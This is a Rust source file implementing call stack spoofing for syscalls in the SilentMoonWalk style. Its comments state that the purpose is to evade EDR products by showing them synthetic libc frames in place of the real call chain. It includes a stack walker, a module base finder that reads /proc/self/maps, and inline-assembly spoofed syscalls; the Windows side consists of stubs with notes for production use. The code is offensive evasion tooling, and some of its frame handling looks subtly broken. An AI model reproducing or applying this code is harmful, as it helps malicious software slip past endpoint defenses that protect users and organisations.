// Call stack spoofing for syscall evasion (SilentMoonWalk-style).
// Modern EDRs analyze the call stack to verify that syscalls originate
// from legitimate call chains (ntdll.dll -> kernel32.dll -> app).
// We craft synthetic return addresses pointing to plausible modules.
//
// Linux version: manipulates RBP chain to point to libc/libpthread frames.

#[cfg(target_os = "linux")]
pub mod linux {
    use std::arch::asm;

    /// Save the current stack frame pointer (RBP).
    #[inline(always)]
    pub fn get_rbp() -> usize {
        let rbp: usize;
        unsafe {
            asm!("mov {}, rbp", out(reg) rbp, options(nostack, nomem));
        }
        rbp
    }

    /// Get the return address from a given frame pointer.
    /// [RBP] = previous RBP, [RBP+8] = return address.
    ///
    /// # Safety
    ///
    /// The caller must ensure `rbp` points to a valid stack frame.
    /// Dereferencing an invalid or misaligned pointer will cause UB.
    #[inline(always)]
    pub unsafe fn get_return_address(rbp: usize) -> usize {
        *(rbp as *const usize).add(1)
    }

    /// Walk the call stack up to `max_frames` deep.
    /// Returns list of return addresses.
    pub fn walk_stack(max_frames: usize) -> Vec<usize> {
        let mut frames = Vec::with_capacity(max_frames);
        let mut rbp = get_rbp();

        for _ in 0..max_frames {
            if rbp == 0 {
                break;
            }
            unsafe {
                let ret_addr = get_return_address(rbp);
                if ret_addr == 0 {
                    break;
                }
                frames.push(ret_addr);
                rbp = *(rbp as *const usize); // follow chain
            }
        }

        frames
    }

    /// Create a synthetic stack frame that points to a legitimate module.
    /// Used to spoof the call chain for syscalls.
    ///
    /// Layout: [saved_rbp][return_addr][...]
    #[allow(dead_code)]
    pub struct SyntheticFrame {
        saved_rbp: usize,
        return_addr: usize,
    }

    impl SyntheticFrame {
        /// Create a frame pointing to a return address in libc.
        pub fn for_module(module_name: &str) -> Option<Self> {
            let addr = find_module_base(module_name)?;
            // Point to a harmless-looking offset in the module
            Some(Self {
                saved_rbp: 0, // end of chain
                return_addr: addr + 0x1000, // safe offset
            })
        }

        /// Get raw pointer for inline asm stack setup.
        pub fn as_ptr(&self) -> *const SyntheticFrame {
            self as *const SyntheticFrame
        }
    }

    /// Find the base address of a loaded module from /proc/self/maps.
    pub fn find_module_base(name: &str) -> Option<usize> {
        if let Ok(maps) = std::fs::read_to_string("/proc/self/maps") {
            for line in maps.lines() {
                if line.contains(name) && line.contains("r-xp") {
                    // Parse: "7f1234000000-7f1234100000 r-xp ... libc.so"
                    let addr_str = line.split('-').next()?;
                    return usize::from_str_radix(addr_str, 16).ok();
                }
            }
        }
        None
    }

    /// Execute a syscall with a spoofed call stack.
    /// The EDR sees the synthetic frames instead of our real call chain.
    ///
    /// # Safety
    ///
    /// The caller must ensure `frames` lives for the duration of the call.
    /// The syscall number and arguments must be valid for the current platform.
    #[allow(clippy::too_many_arguments)]
    pub unsafe fn spoofed_syscall6(
        nr: i64, a1: i64, a2: i64, a3: i64, a4: i64, a5: i64, a6: i64,
        frames: &[SyntheticFrame],
    ) -> i64 {
        let ret: i64;
        let frame_ptrs: Vec<*const SyntheticFrame> = frames.iter().map(|f| f.as_ptr()).collect();

        asm!(
            // Save real RBP
            "push rbp",
            // Build synthetic chain
            "lea rbp, [{frames_ptr}]",
            // Execute syscall
            "syscall",
            // Restore RBP
            "pop rbp",

            frames_ptr = in(reg) frame_ptrs.as_ptr(),
            in("rax") nr,
            in("rdi") a1, in("rsi") a2, in("rdx") a3,
            in("r10") a4, in("r8") a5, in("r9") a6,
            lateout("rax") ret,
            lateout("rcx") _, lateout("r11") _,
            options(nostack),
        );

        ret
    }

    /// Check if the call stack appears to have been tampered with
    /// (EDR counter-countermeasure: detect our own spoofing).
    pub fn detect_stack_spoofing() -> bool {
        let frames = walk_stack(10);
        if frames.len() < 2 {
            return false;
        }

        // If the stack trace doesn't show expected libc frames,
        // something might be wrong (or we're already spoofing)
        let libc_base = find_module_base("libc");
        let has_libc = frames.iter().any(|&addr| {
            libc_base.is_some_and(|base| {
                addr >= base && addr < base + 0x200000
            })
        });

        !has_libc // If no libc frame, stack might be spoofed
    }
}

// ── Windows stubs ─────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub mod windows {
    /// Placeholder for Windows call stack spoofing via unwinder crate.
    /// In production: use indirect_syscall!() macro with synthetic frames
    /// pointing to ntdll.dll, kernel32.dll, kernelbase.dll.

    pub fn walk_stack(_max: usize) -> Vec<usize> { Vec::new() }

    pub fn find_module_base(_name: &str) -> Option<usize> { None }

    pub unsafe fn spoofed_syscall(
        _ssn: u32, _args: &[usize], _frames: &[usize],
    ) -> i32 { -1 }
}

// ── Re-exports ───────────────────────────────────────────────────────────────

#[cfg(target_os = "linux")]
pub use linux::*;

#[cfg(target_os = "windows")]
pub use windows::*;
